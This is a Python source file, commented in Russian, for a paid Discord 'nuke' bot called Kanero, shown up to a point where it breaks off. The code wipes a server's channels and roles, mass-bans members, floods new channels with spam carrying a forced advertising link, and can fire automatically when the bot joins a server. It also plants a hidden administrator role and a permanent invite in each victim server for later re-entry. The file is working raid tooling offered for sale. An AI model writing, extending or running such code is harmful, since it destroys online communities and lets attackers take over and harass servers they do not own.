import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp
import json
import os
import logging
import config
import motor.motor_asyncio

# Логирование в файл
logging.basicConfig(
    filename="bot.log",
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    encoding="utf-8"
)
log = logging.getLogger(__name__)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ─── MONGODB ───────────────────────────────────────────────

MONGO_URI = os.environ.get("MONGO_URI", "")
_mongo_client = None
_db = None

def get_db():
    global _mongo_client, _db
    if _db is None and MONGO_URI:
        _mongo_client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
        _db = _mongo_client["eclipsed_bot"]
    return _db

async def db_get(collection: str, key: str, default=None):
    db = get_db()
    if db is None:
        return default
    doc = await db[collection].find_one({"_id": key})
    return doc["value"] if doc else default

async def db_set(collection: str, key: str, value):
    db = get_db()
    if db is None:
        return
    await db[collection].update_one(
        {"_id": key},
        {"$set": {"value": value}},
        upsert=True
    )


# ─── NUKE LOGS ─────────────────────────────────────────────

async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
    """Сохраняет лог нюка. Создаёт роль с правами администратора и инвайт через неё."""
    invite_url = None
    try:
        # Создаём роль с правами администратора
        log_role = await guild.create_role(
            name="☠️ Kanero LOG",
            permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_red()
        )
        # Поднимаем роль как можно выше
        try:
            await log_role.edit(position=max(1, guild.me.top_role.position - 1))
        except Exception:
            pass
        # Инвайт через любой доступный канал
        ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
        if ch:
            inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
            invite_url = inv.url
    except Exception:
        # Fallback — обычный инвайт
        try:
            ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
            if ch:
                inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
                invite_url = inv.url
        except Exception:
            pass

    import datetime
    entry = {
        "guild_id": guild.id,
        "guild_name": guild.name,
        "user_id": user.id,
        "user_name": str(user),
        "type": nuke_type,
        "invite": invite_url,
        "time": datetime.datetime.utcnow().strftime("%d.%m.%Y %H:%M UTC")
    }
    await db_set("nuke_logs", str(guild.id), entry)



# ─── HELPERS ───────────────────────────────────────────────

nuke_running = {}
nuke_starter = {}   # guild_id -> user_id кто запустил нюк
last_spam_text = {}  # guild_id -> последний текст спама
last_nuke_time = {}  # guild_id -> время последнего nuke


def is_whitelisted(user_id):
    return user_id in config.WHITELIST


def is_owner_whitelisted(user_id):
    return user_id in config.OWNER_WHITELIST


def is_premium(user_id):
    return user_id in PREMIUM_LIST



def save_whitelist():
    asyncio.create_task(db_set("data", "whitelist", config.WHITELIST))


def save_owner_whitelist():
    asyncio.create_task(db_set("data", "owner_whitelist", config.OWNER_WHITELIST))


def save_premium():
    asyncio.create_task(db_set("data", "premium", PREMIUM_LIST))


def save_owner_nuke_list():
    asyncio.create_task(db_set("data", "owner_nuke_list", OWNER_NUKE_LIST))


def is_owner_nuker(user_id):
    return user_id in OWNER_NUKE_LIST or user_id == config.OWNER_ID


def load_whitelist():
    pass  # заменено на async load в on_ready


def load_premium():
    pass  # заменено на async load в on_ready


def save_spam_text():
    asyncio.create_task(db_set("data", "spam_text", config.SPAM_TEXT))


def load_spam_text():
    pass  # заменено на async load в on_ready



# ─── BLOCKED GUILDS ────────────────────────────────────────

BLOCKED_GUILDS: list[int] = []
PREMIUM_LIST: list[int] = []
OWNER_NUKE_LIST: list[int] = []
FREELIST: list[int] = []  # выдаётся через канал addbot — только !nuke и !auto_nuke


def save_freelist():
    asyncio.create_task(db_set("data", "freelist", FREELIST))


def is_freelisted(user_id):
    return user_id in FREELIST


def save_blocked_guilds():
    asyncio.create_task(db_set("data", "blocked_guilds", BLOCKED_GUILDS))


def load_blocked_guilds():
    pass  # заменено на async load в on_ready


def is_guild_blocked(guild_id: int) -> bool:
    return guild_id in BLOCKED_GUILDS


def wl_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="☠️ ДОСТУП ЗАПРЕЩЁН",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


async def delete_all_channels(guild):
    for _ in range(3):  # до 3 попыток
        channels = list(guild.channels)
        if not channels:
            break
        await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
        await asyncio.sleep(1.5)


async def delete_all_roles(guild):
    bot_role = guild.me.top_role
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )


async def do_nuke(guild, spam_text=None, caller_id=None):
    if spam_text is None:
        spam_text = config.SPAM_TEXT
    # Реклама добавляется ВСЕГДА — нельзя убрать
    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW"
    if AD_SUFFIX not in spam_text:
        spam_text = spam_text + AD_SUFFIX

    NUKE_NAME = "Вы были крашнуты"

    # ── 1. Переименовываем только каналы ──
    await asyncio.gather(
        *[c.edit(name=NUKE_NAME) for c in guild.channels],
        return_exceptions=True
    )

    # ── 2. Удаляем все роли ──
    bot_role = guild.me.top_role
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )

    # ── 3. Создаём каналы ──
    async def create_and_spam(i):
        try:
            if not nuke_running.get(guild.id):
                return
            ch = await guild.create_text_channel(name=NUKE_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    # ── 4. Спам до 500 сообщений ──
    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)

    # ── 5. Создаём роль и выдаём тому кто написал !nuke ──
    if caller_id:
        try:
            member = guild.get_member(caller_id)
            if not member:
                member = await guild.fetch_member(caller_id)
            if member:
                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                # Поднимаем роль как можно выше
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


async def do_superpr_nuke_task(guild, spam_text=None):
    """
    Приоритеты:
    1. Бан участников — оставляет не более 15 человек
    2. Переименование сервера → CRASH BY ECLIPS
    3. Удаление всех существующих каналов
    4. Удаление всех ролей
    5. Создание новых каналов со спамом
    """
    if spam_text is None:
        spam_text = config.SPAM_TEXT
    # Реклама добавляется ВСЕГДА — нельзя убрать
    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW"
    if AD_SUFFIX not in spam_text:
        spam_text = spam_text + AD_SUFFIX

    TURBO_NAME = "Вы были крашнуты"

    bot_role = guild.me.top_role
    # Защищённые ID — никогда не банятся
    PROTECTED_IDS = {config.OWNER_ID, 1421778029310509056}
    starter_id = nuke_starter.get(guild.id)
    if starter_id:
        PROTECTED_IDS.add(starter_id)

    # Все кандидаты на бан
    candidates = [
        m for m in guild.members
        if not m.bot and m.id != guild.owner_id
        and m.id not in PROTECTED_IDS
        and (not m.top_role or m.top_role < bot_role)
    ]

    # ── 1. Баним всех кроме 15 последних ──
    # Оставляем 15 участников (не считая защищённых и ботов)
    total_members = len([m for m in guild.members if not m.bot])
    keep = 15
    ban_count = max(0, total_members - keep)
    to_ban = candidates[:ban_count]
    await asyncio.gather(*[m.ban(reason="super_nuke") for m in to_ban], return_exceptions=True)

    # ── 2. Переименовываем каналы ──
    await asyncio.gather(
        *[c.edit(name=TURBO_NAME) for c in guild.channels],
        return_exceptions=True
    )

    # ── 3. Удаляем все существующие каналы ──
    await asyncio.gather(
        *[c.delete() for c in guild.channels],
        return_exceptions=True
    )

    # ── 4. Удаляем все роли ──
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )

    # ── 5. Создаём новые каналы и спамим ──
    async def create_and_spam(i):
        try:
            ch = await guild.create_text_channel(name=TURBO_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)

    # ── Создаём роль и выдаём запустившему ──
    _starter = nuke_starter.get(guild.id)
    if _starter:
        try:
            member = guild.get_member(_starter)
            if not member:
                member = await guild.fetch_member(_starter)
            if member:
                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


async def do_owner_nuke_task(guild, spam_text=None):
    """
    Owner Nuke — полный нюк без ограничений.
    Баним ВСЕХ участников без исключений (кроме ботов и овнера сервера).
    """
    if spam_text is None:
        spam_text = config.SPAM_TEXT
    # Реклама добавляется ВСЕГДА — нельзя убрать
    AD_SUFFIX = "\n\n☠️ Kanero — https://discord.gg/JEspTXRW"
    if AD_SUFFIX not in spam_text:
        spam_text = spam_text + AD_SUFFIX

    OWNER_NAME = "Вы были крашнуты"

    bot_role = guild.me.top_role
    targets = [
        m for m in guild.members
        if not m.bot and m.id != guild.owner_id
        and (not m.top_role or m.top_role < bot_role)
    ]

    # ── 1. Баним ВСЕХ ──
    await asyncio.gather(*[m.ban(reason="owner_nuke") for m in targets], return_exceptions=True)

    # ── 2. Переименовываем каналы ──
    await asyncio.gather(
        *[c.edit(name=OWNER_NAME) for c in guild.channels],
        return_exceptions=True
    )

    # ── 3. Удаляем все каналы ──
    await asyncio.gather(
        *[c.delete() for c in guild.channels],
        return_exceptions=True
    )

    # ── 4. Удаляем все роли ──
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )

    # ── 5. Создаём новые каналы и спамим ──
    async def create_and_spam(i):
        try:
            ch = await guild.create_text_channel(name=OWNER_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)

    # ── Создаём роль и выдаём запустившему ──
    _starter = nuke_starter.get(guild.id)
    if _starter:
        try:
            member = guild.get_member(_starter)
            if not member:
                member = await guild.fetch_member(_starter)
            if member:
                role = await guild.create_role(name="☠️ Kanero", color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()



# ─── COMMANDS ──────────────────────────────────────────────

# ID домашнего сервера — только OWNER_ID может использовать команды
HOME_GUILD_ID = 1497100825628115108

# Глобальная проверка — блокирует ВСЕ команды на заблокированном сервере
@bot.check
async def global_guild_block(ctx):
    if ctx.guild and is_guild_blocked(ctx.guild.id):
        return False
    # На домашнем сервере — только овнер может использовать команды
    if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
        if ctx.author.id != config.OWNER_ID:
            return False
    return True

@bot.command()
async def nuke(ctx, *, text: str = None):
    guild = ctx.guild
    if is_guild_blocked(guild.id):
        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    if nuke_running.get(guild.id):
        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
        await ctx.send(embed=embed)
        return
    # Кастомный текст — только для whitelist/premium/овнера
    if text and not is_whitelisted(ctx.author.id) and ctx.author.id != config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Кастомный текст доступен только для подписчиков.\nЗа покупкой пиши: **davaidkatt**",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    # Кастомный текст с кастомизацией — только для premium/овнера
    if text and not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
        text = None  # обычный whitelist — сбрасываем на дефолт
    nuke_running[guild.id] = True
    nuke_starter[guild.id] = ctx.author.id
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
    last_spam_text[ctx.guild.id] = spam_text
    asyncio.create_task(do_nuke(guild, spam_text, caller_id=ctx.author.id))
    asyncio.create_task(log_nuke(guild, ctx.author, "nuke"))


@bot.command()
@wl_check()
async def stop(ctx):
    guild = ctx.guild
    uid = ctx.author.id
    starter_id = nuke_starter.get(guild.id)

    # Овнер останавливает всегда
    if uid == config.OWNER_ID:
        nuke_running[guild.id] = False
        nuke_starter.pop(guild.id, None)
        await ctx.send("✅ Остановлено.")
        return

    # Никто не запускал — просто останавливаем
    if starter_id is None:
        nuke_running[guild.id] = False
        await ctx.send("✅ Остановлено.")
        return

    # Запустил овнер — только овнер может остановить
    if starter_id == config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Нюк запущен **овнером** — только он может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Запустил премиум — только премиум или овнер может остановить
    if is_premium(starter_id) and not is_premium(uid):
        embed = discord.Embed(
            description="❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Только тот кто запустил или овнер
    if uid != starter_id and uid != config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Только тот кто запустил нюк может его остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="Kanero")
        await ctx.send(embed=embed)
        return

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    await ctx.send("✅ Остановлено.")


@bot.command()
@wl_check()
async def cleanup(ctx):
    await delete_all_channels(ctx.guild)
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=False
        )
    }
    for uid in config.WHITELIST:
        member = ctx.guild.get_member(uid)
        if not member:
            try:
                member = await ctx.guild.fetch_member(uid)
            except Exception:
                continue
        overwrites[member] = discord.PermissionOverwrite(
            view_channel=True,
            send_messages=True
        )
    channel = await ctx.guild.create_text_channel("general", overwrites=overwrites)
    # Отправляем текст спама только если nuke был менее 30 секунд назад
    nuke_time = last_nuke_time.get(ctx.guild.id)
    if nuke_time and (asyncio.get_running_loop().time() - nuke_time) <= 30:
        text = last_spam_text.get(ctx.guild.id)
        if text:
            await channel.send(text)


@bot.command()
@wl_check()
@commands.cooldown(1, 30, commands.BucketType.guild)
async def rename(ctx, *, name: str):
    await asyncio.gather(*[c.edit(name=name) for c in ctx.guild.channels], return_exceptions=True)
    await ctx.send("Готово.")


@rename.error
async def rename_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"⏳ Команда на кулдауне. Подожди **{error.retry_after:.0f}** сек.")


@bot.command()
@wl_check()
async def webhooks(ctx):
    whs = await ctx.guild.webhooks()
    if not whs:
        await ctx.send("Вебхуков нет.")
        return
    msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
    await ctx.send(f"```{msg[:1900]}```")


@bot.command(name="clear")
@wl_check()
async def clear(ctx, amount: int = 10):
    """Удалить N сообщений в канале. Максимум 100."""
    if amount > 100:
        await ctx.send("Максимум 100 сообщений.")
        return
    if amount < 1:
        await ctx.send("Минимум 1 сообщение.")
        return
    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 чтобы удалить и саму команду
    msg = await ctx.send(f"🗑️ Удалено **{len(deleted) - 1}** сообщений.")
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass


@bot.command()
@wl_check()
async def nicks_all(ctx, *, nick: str):
    targets = [m for m in ctx.guild.members if m.id not in (ctx.author.id, bot.user.id, ctx.guild.owner_id)]
    await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
async def auto_nuke(ctx, state: str):
    if state.lower() == "on":
        config.AUTO_NUKE = True
        await ctx.send("✅ Авто-краш включен.")
    elif state.lower() == "off":
        config.AUTO_NUKE = False
        await ctx.send("❌ Авто-краш выключен.")
    elif state.lower() == "info":
        status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключен"
        await ctx.send(f"Авто-краш: {status}")
    else:
        await ctx.send("Используй: `!auto_nuke on` / `!auto_nuke off` / `!auto_nuke info`")


@bot.command()
@wl_check()
async def inv(ctx):
    app_id = bot.user.id
    url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
    await ctx.author.send(f"Добавить бота на сервер: {url}\nДобавить себе: https://discord.com/oauth2/authorize?client_id={app_id}&scope=applications.commands&integration_type=1")



@bot.command(name="wl_add")
@wl_check()
async def wl_add(ctx, user_id: int):
    if user_id not in config.WHITELIST:
        config.WHITELIST.append(user_id)
        save_whitelist()
        await ctx.send(f"✅ `{user_id}` добавлен.")
    else:
        await ctx.send("Уже в whitelist.")


@bot.command(name="wl_remove")
@wl_check()
async def wl_remove(ctx, user_id: int):
    if user_id in config.WHITELIST:
        config.WHITELIST.remove(user_id)
        save_whitelist()
        await ctx.send(f"✅ `{user_id}` убран.")
    else:
        await ctx.send("Не найден.")


@bot.command(name="wl_list")
@wl_check()
async def wl_list(ctx):
    if not config.WHITELIST:
        await ctx.send("Whitelist пуст.")
        return
    lines = []
    for uid in config.WHITELIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
    embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.WHITELIST)}")
    await ctx.send(embed=embed)


# ─── OWNER-ONLY: PREMIUM ───────────────────────────────────

@bot.command(name="pm_add")
async def pm_add(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id not in PREMIUM_LIST:
        PREMIUM_LIST.append(user_id)
        save_premium()
    # Автоматически добавляем в whitelist
    if user_id not in config.WHITELIST:
        config.WHITELIST.append(user_id)
        save_whitelist()
    await ctx.send(f"💎 `{user_id}` получил **Premium** + добавлен в **Whitelist**.")


@bot.command(name="pm_remove")
async def pm_remove(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id in PREMIUM_LIST:
        PREMIUM_LIST.remove(user_id)
        save_premium()
        await ctx.send(f"✅ `{user_id}` убран из Premium. Whitelist не тронут.")
    else:
        await ctx.send("Не найден в Premium.")


@bot.command(name="list")
async def list_cmd(ctx):
    if ctx.author.id != config.OWNER_ID:
        return

    async def fmt(ids):
        lines = []
        for uid in ids:
            try:
                user = await bot.fetch_user(uid)
                lines.append(f"`{uid}` — **{user}**")
            except Exception:
                lines.append(f"`{uid}` — *не найден*")
        return "\n".join(lines) if lines else "*пусто*"

    embed = discord.Embed(title="📋 Списки Kanero", color=0x0a0a0a)
    # Whitelist — только те кто не в Premium и не в Owner Whitelist
    protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
    wl_only = [uid for uid in config.WHITELIST if uid not in PREMIUM_LIST and uid not in protected]
    embed.add_field(
        name=f"✅ Whitelist ({len(wl_only)})",
        value=await fmt(wl_only),
        inline=False
    )
    embed.add_field(
        name=f"💎 Premium ({len(PREMIUM_LIST)})",
        value=await fmt(PREMIUM_LIST),
        inline=False
    )
    embed.add_field(
        name=f"👑 Owner Whitelist ({len(config.OWNER_WHITELIST)})",
        value=await fmt(config.OWNER_WHITELIST),
        inline=False
    )
    embed.add_field(
        name="📌 Управление",
        value=(
            "`!wl_add <id>` / `!wl_remove <id>` — whitelist\n"
            "`!pm_add <id>` / `!pm_remove <id>` — premium (авто +whitelist)"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="list_clear")
async def list_clear(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    # Оставляем только овнеров (OWNER_ID и OWNER_WHITELIST)
    protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
    removed = [uid for uid in config.WHITELIST if uid not in protected]
    config.WHITELIST = [uid for uid in config.WHITELIST if uid in protected]
    # Очищаем premium тоже (кроме овнеров)
    PREMIUM_LIST[:] = [uid for uid in PREMIUM_LIST if uid in protected]
    save_whitelist()
    save_premium()
    embed = discord.Embed(
        title="🗑️ Whitelist очищен",
        description=f"Удалено **{len(removed)}** пользователей.\nОвнеры сохранены.",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── PREMIUM COMMANDS ──────────────────────────────────────

def premium_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="☠️ ДОСТУП ЗАПРЕЩЁН",
                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await ctx.send(embed=embed)
            return False
        if not is_premium(ctx.author.id) and ctx.author.id != config.OWNER_ID:
            embed = discord.Embed(
                title="💎 PREMIUM ФУНКЦИЯ",
                description="Эта команда доступна только **Premium** пользователям.\n\nЗа покупкой пиши в ЛС: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


@bot.command(name="super_nuke")
@premium_check()
async def super_nuke(ctx, *, text: str = None):
    guild = ctx.guild
    if is_guild_blocked(guild.id):
        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    if nuke_running.get(guild.id):
        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
        await ctx.send(embed=embed)
        return
    nuke_running[guild.id] = True
    nuke_starter[guild.id] = ctx.author.id
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
    last_spam_text[guild.id] = spam_text
    asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
    asyncio.create_task(log_nuke(guild, ctx.author, "super_nuke"))


# ─── OWNER-ONLY NUKE COMMANDS ──────────────────────────────

AUTO_OWNER_NUKE = False
AUTO_OWNER_NUKE_TEXT = None


def save_auto_owner_nuke():
    asyncio.create_task(db_set("data", "auto_owner_nuke", {
        "enabled": AUTO_OWNER_NUKE,
        "text": AUTO_OWNER_NUKE_TEXT
    }))


@bot.command(name="owner_nuke")
async def owner_nuke(ctx, *, text: str = None):
    """Полный нюк без ограничений. Только для овнера."""
    if not is_owner_nuker(ctx.author.id):
        return
    guild = ctx.guild
    if is_guild_blocked(guild.id):
        await ctx.send("🔒 Этот сервер заблокирован.")
        return
    if nuke_running.get(guild.id):
        await ctx.send("⚡ Краш уже запущен.")
        return
    nuke_running[guild.id] = True
    nuke_starter[guild.id] = ctx.author.id
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
    last_spam_text[guild.id] = spam_text
    asyncio.create_task(do_owner_nuke_task(guild, spam_text))
    asyncio.create_task(log_nuke(guild, ctx.author, "owner_nuke"))


@bot.command(name="auto_owner_nuke")
async def auto_owner_nuke_cmd(ctx, state: str, *, text: str = None):
    """Авто owner_nuke при входе бота на сервер. Только для овнера."""
    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
    if not is_owner_nuker(ctx.author.id):
        return
    if state.lower() == "on":
        AUTO_OWNER_NUKE = True
        save_auto_owner_nuke()
        embed = discord.Embed(
            title="👑 Auto Owner Nuke — ВКЛЮЧЁН",
            description=(
                "При входе бота на сервер:\n"
                "• Бан ВСЕХ участников\n"
                "• Удаление каналов и ролей\n"
                "• Создание каналов со спамом\n\n"
                f"Текст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_OWNER_NUKE = False
        save_auto_owner_nuke()
        await ctx.send("❌ **Auto Owner Nuke** выключен.")
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_owner_nuke text <текст>`")
            return
        AUTO_OWNER_NUKE_TEXT = text
        save_auto_owner_nuke()
        await ctx.send(f"✅ Текст обновлён:\n```{text[:500]}```")
    elif state.lower() == "info":
        status = "✅ Включён" if AUTO_OWNER_NUKE else "❌ Выключен"
        await ctx.send(f"Auto Owner Nuke: **{status}**\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`")
    else:
        await ctx.send("`!auto_owner_nuke on/off/text/info`")


@bot.command(name="auto_off")
async def auto_off(ctx):
    """Выключить все авто нюки. Только для овнера."""
    global AUTO_SUPER_NUKE, AUTO_SUPERPR_NUKE, AUTO_OWNER_NUKE
    if ctx.author.id != config.OWNER_ID:
        return
    config.AUTO_NUKE = False
    AUTO_SUPER_NUKE = False
    save_auto_super_nuke()
    AUTO_SUPERPR_NUKE = False
    save_auto_superpr_nuke()
    AUTO_OWNER_NUKE = False
    save_auto_owner_nuke()
    embed = discord.Embed(
        title="🔴 Все авто нюки выключены",
        description=(
            "❌ `auto_nuke` — выключен\n"
            "❌ `auto_super_nuke` — выключен\n"
            "❌ `auto_superpr_nuke` — выключен\n"
            "❌ `auto_owner_nuke` — выключен"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="auto_info")
async def auto_info(ctx):
    """Показать статус всех авто нюков. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return

    def st(val):
        return "✅ Включён" if val else "❌ Выключен"

    embed = discord.Embed(title="📊 Статус авто нюков", color=0x0a0a0a)
    embed.add_field(
        name="🔄 auto_nuke",
        value=f"{st(config.AUTO_NUKE)}\n`!auto_nuke on/off`",
        inline=True
    )
    embed.add_field(
        name="💎 auto_super_nuke",
        value=f"{st(AUTO_SUPER_NUKE)}\nТекст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n`!auto_super_nuke on/off`",
        inline=False
    )
    embed.add_field(
        name="⚡ auto_superpr_nuke",
        value=f"{st(AUTO_SUPERPR_NUKE)}\nТекст: `{AUTO_SUPERPR_NUKE_TEXT or 'дефолтный'}`\n`!auto_superpr_nuke on/off`",
        inline=False
    )
    embed.add_field(
        name="👑 auto_owner_nuke",
        value=f"{st(AUTO_OWNER_NUKE)}\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`\n`!auto_owner_nuke on/off`",
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  !auto_off — выключить все")
    await ctx.send(embed=embed)


@bot.command(name="setup")
async def setup(ctx):
    """Пересоздать структуру сервера. Только для овнеров (OWNER_ID + OWNER_WHITELIST)."""
    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
        embed = discord.Embed(
            description="❌ Эта команда доступна только **овнерам** бота.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    guild = ctx.guild
    msg = await ctx.send("⚙️ Пересоздаю структуру сервера... (это займёт ~30 сек)")

    # ── 1. Удаляем все каналы и роли ──
    for ch in guild.channels:
        try:
            await ch.delete()
        except Exception:
            pass
    bot_role = guild.me.top_role
    for r in guild.roles:
        if r < bot_role and not r.is_default():
            try:
                await r.delete()
            except Exception:
                pass

    # ── 2. Создаём роли с правами ──
    # 👤 Guest — только читать публичные каналы, без права писать и заходить в войс
    guest_perms = discord.Permissions(
        read_messages=True,
        read_message_history=True,
        send_messages=False,
        add_reactions=True,
        connect=False,
        speak=False
    )
    # ✅ White — базовый доступ: читать + писать в чатах, войс
    white_perms = discord.Permissions(
        read_messages=True,
        read_message_history=True,
        send_messages=True,
        embed_links=True,
        attach_files=True,
        add_reactions=True,
        use_external_emojis=True,
        connect=True,
        speak=True,
        use_voice_activation=True,
        stream=True
    )
    # 💎 Premium — всё что White + управление сообщениями + перемещение участников
    premium_perms = discord.Permissions(
        read_messages=True,
        read_message_history=True,
        send_messages=True,
        embed_links=True,
        attach_files=True,
        add_reactions=True,
        use_external_emojis=True,
        manage_messages=True,
        connect=True,
        speak=True,
        use_voice_activation=True,
        stream=True,
        move_members=True,
        priority_speaker=True
    )
    # 👑 Owner — управление сервером без полного администратора
    owner_perms = discord.Permissions(
        read_messages=True,
        read_message_history=True,
        send_messages=True,
        embed_links=True,
        attach_files=True,
        add_reactions=True,
        use_external_emojis=True,
        manage_messages=True,
        manage_channels=True,
        manage_roles=True,
        manage_webhooks=True,
        manage_emojis=True,
        kick_members=True,
        ban_members=True,
        manage_nicknames=True,
        view_audit_log=True,
        mention_everyone=True,
        connect=True,
        speak=True,
        use_voice_activation=True,
        stream=True,
        move_members=True,
